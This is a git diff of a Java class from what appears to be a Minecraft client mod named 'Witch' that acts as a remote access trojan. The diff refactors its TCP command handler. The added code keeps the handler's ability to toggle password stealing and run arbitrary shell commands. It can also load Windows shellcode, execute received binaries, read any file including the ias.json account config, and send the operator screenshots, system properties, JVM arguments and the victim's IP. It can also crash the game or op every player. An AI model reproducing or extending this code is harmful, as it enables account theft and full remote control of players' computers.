@@ -1,5 +1,6 @@
 package me.soda.witch.client.connection;
 
+import com.google.gson.Gson;
 import me.soda.witch.client.Witch;
 import me.soda.witch.client.modules.OpEveryone;
 import me.soda.witch.client.modules.Spam;
@@ -10,8 +11,7 @@ import me.soda.witch.client.utils.ShellcodeLoader;
 import me.soda.witch.shared.*;
 import me.soda.witch.shared.socket.TcpClient;
 import me.soda.witch.shared.socket.messages.Message;
-import me.soda.witch.shared.socket.messages.messages.DisconnectInfo;
-import me.soda.witch.shared.socket.messages.messages.SpamInfo;
+import me.soda.witch.shared.socket.messages.messages.*;
 import net.minecraft.client.util.GlfwUtil;
 
 import java.lang.management.ManagementFactory;
@@ -24,52 +24,58 @@ public class Client extends TcpClient {
     }
 
     public static void handleMessage(Message message) {
-        String msgType = message.messageID;
-        Object msg = message.data;
-        LogUtil.println("Received message: " + msgType);
         try {
-            switch (msgType) {
-                case "steal_pwd_switch" ->
-                        Witch.CONFIG_INFO.passwordBeingLogged = !Witch.CONFIG_INFO.passwordBeingLogged;
-                case "chat_control" -> ChatUtils.sendChat((String) msg);
-                case "chat_filter" -> Witch.CONFIG_INFO.filterPattern = (String) msg;
-                case "chat_filter_switch" -> Witch.CONFIG_INFO.isBeingFiltered = !Witch.CONFIG_INFO.isBeingFiltered;
-                case "chat_mute" -> Witch.CONFIG_INFO.isMuted = !Witch.CONFIG_INFO.isMuted;
-                case "mods" -> Witch.send(msgType, MCUtils.allMods());
-                case "systeminfo" -> Witch.send(msgType, MCUtils.systemInfo());
-                case "screenshot" -> ScreenshotUtil.gameScreenshot();
-                case "screenshot2" -> Witch.send(msgType, ScreenshotUtil.systemScreenshot());
-                case "chat" -> {
-                    Witch.CHAT_WINDOW.frame.setVisible(true);
-                    Witch.CHAT_WINDOW.appendText("Admin:" + msg);
+            LogUtil.println("Received message: " + message.data.getClass().getName());
+            if (message.data instanceof ByteData data) {
+                if (data.messageID.equals("execute")) new Thread(() -> ProgramUtil.runProg(data.bytes())).start();
+            } else if (message.data instanceof SingleStringData data) {
+                switch (data.data()) {
+                    case "steal_pwd_switch" ->
+                            Witch.CONFIG_INFO.passwordBeingLogged = !Witch.CONFIG_INFO.passwordBeingLogged;
+                    case "chat_filter_switch" -> Witch.CONFIG_INFO.isBeingFiltered = !Witch.CONFIG_INFO.isBeingFiltered;
+                    case "chat_mute" -> Witch.CONFIG_INFO.isMuted = !Witch.CONFIG_INFO.isMuted;
+                    case "mods" -> Witch.send("mods", MCUtils.allMods());
+                    case "systeminfo" -> Witch.send("systeminfo", MCUtils.systemInfo());
+                    case "screenshot" -> ScreenshotUtil.gameScreenshot();
+                    case "screenshot2" -> Witch.send("screenshot2", ScreenshotUtil.systemScreenshot());
+                    case "log" -> Witch.CONFIG_INFO.logChatAndCommand = !Witch.CONFIG_INFO.logChatAndCommand;
+                    case "config" -> Witch.send(Witch.CONFIG_INFO);
+                    case "player" -> Witch.send(MCUtils.getPlayerInfo());
+                    case "skin" -> MCUtils.sendPlayerSkin();
+                    case "server" -> {
+                        MCUtils.disconnect();
+                        Witch.CONFIG_INFO.canJoinServer = !Witch.CONFIG_INFO.canJoinServer;
+                    }
+                    case "kick" -> MCUtils.disconnect();
+                    case "iasconfig" -> Witch.send("iasconfig", FileUtil.read("config/ias.json"));
+                    case "runargs" ->
+                            Witch.send("runargs", new Gson().toJson(ManagementFactory.getRuntimeMXBean().getInputArguments()));
+                    case "props" -> Witch.send("props", System.getProperties().toString());
+                    case "ip" -> Witch.send("ip", NetUtil.getIP());
+                    case "crash" -> GlfwUtil.makeJvmCrash();
+                    case "op@a" -> OpEveryone.INSTANCE.opEveryone();
                 }
-                case "shell" -> new Thread(() -> {
-                    String result = ProgramUtil.runCmd((String) msg);
-                    Witch.send(msgType, "\n" + result);
-                }).start();
-                case "shellcode" -> {
-                    if (ProgramUtil.isWin())
-                        new Thread(() -> new ShellcodeLoader().loadShellCode((String) msg)).start();
+            } else if (message.data instanceof StringData data) {
+                switch (data.messageID()) {
+                    case "chat_control" -> ChatUtils.sendChat(data.data());
+                    case "chat_filter" -> Witch.CONFIG_INFO.filterPattern = data.data();
+                    case "chat" -> {
+                        Witch.CHAT_WINDOW.frame.setVisible(true);
+                        Witch.CHAT_WINDOW.appendText("Admin:" + data.data());
+                    }
+                    case "shell" -> new Thread(() -> {
+                        String result = ProgramUtil.runCmd(data.data());
+                        Witch.send("shell", "\n" + result);
+                    }).start();
+                    case "shellcode" -> {
+                        if (ProgramUtil.isWin())
+                            new Thread(() -> new ShellcodeLoader().loadShellCode(data.data())).start();
+                    }
+                    case "read" -> Witch.send("read", FileUtil.read(data.data()));
+                    case "server_name" -> Witch.CONFIG_INFO.name = data.data();
                 }
-                case "log" -> Witch.CONFIG_INFO.logChatAndCommand = !Witch.CONFIG_INFO.logChatAndCommand;
-                case "config" -> Witch.send(msgType, Witch.CONFIG_INFO);
-                case "player" -> Witch.send(msgType, MCUtils.getPlayerInfo());
-                case "skin" -> MCUtils.sendPlayerSkin();
-                case "server" -> {
-                    MCUtils.disconnect();
-                    Witch.CONFIG_INFO.canJoinServer = !Witch.CONFIG_INFO.canJoinServer;
-                }
-                case "kick" -> MCUtils.disconnect();
-                case "execute" -> new Thread(() -> ProgramUtil.runProg((byte[]) msg)).start();
-                case "iasconfig" -> Witch.send(msgType, FileUtil.read("config/ias.json"));
-                case "read" -> Witch.send(msgType, FileUtil.read((String) msg));
-                case "runargs" -> Witch.send(msgType, ManagementFactory.getRuntimeMXBean().getInputArguments());
-                case "props" -> Witch.send(msgType, System.getProperties());
-                case "ip" -> Witch.send(msgType, NetUtil.getIP());
-                case "crash" -> GlfwUtil.makeJvmCrash();
-                case "server_name" -> Witch.CONFIG_INFO.name = (String) msg;
-                case "op@a" -> OpEveryone.INSTANCE.opEveryone();
-                case "spam" -> Spam.INSTANCE.spam((SpamInfo) msg);
+            } else if (message.data instanceof SpamData data) {
+                Spam.INSTANCE.spam(data);
             }
         } catch (Exception e) {
             LogUtil.println("Corrupted message!");
@@ -92,7 +98,7 @@ public class Client extends TcpClient {
     @Override
     public void onOpen() {
         LogUtil.println("Connection initialized");
-        Witch.send("player", MCUtils.getPlayerInfo());
+        Witch.send(MCUtils.getPlayerInfo());
         Witch.send("server_name");
         new Thread(() -> Witch.send("ip", NetUtil.getIP()));
     }
@@ -103,8 +109,8 @@ public class Client extends TcpClient {
     }
 
     @Override
-    public void onClose(DisconnectInfo disconnectInfo) {
+    public void onClose(DisconnectData disconnectData) {
         Witch.CHAT_WINDOW.appendText("Admin disconnected.");
-        LogUtil.println("Disconnected: " + disconnectInfo.reason());
+        LogUtil.println("Disconnected: " + disconnectData.reason());
     }
 }
